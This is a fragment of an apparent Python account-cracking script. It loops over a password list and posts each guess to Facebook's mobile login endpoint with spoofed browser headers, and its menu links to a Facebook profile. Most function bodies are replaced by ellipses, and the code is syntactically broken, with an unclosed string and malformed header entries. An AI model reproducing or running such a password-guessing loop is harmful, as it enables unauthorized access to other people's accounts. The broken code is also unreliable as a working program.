...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-open https://www.facebook.com/profile.php?id=61550123941433)
       main()  
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': 'pro,}
            'viewport-width': '980',}
            lo = session.post('https://mfree.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header).text
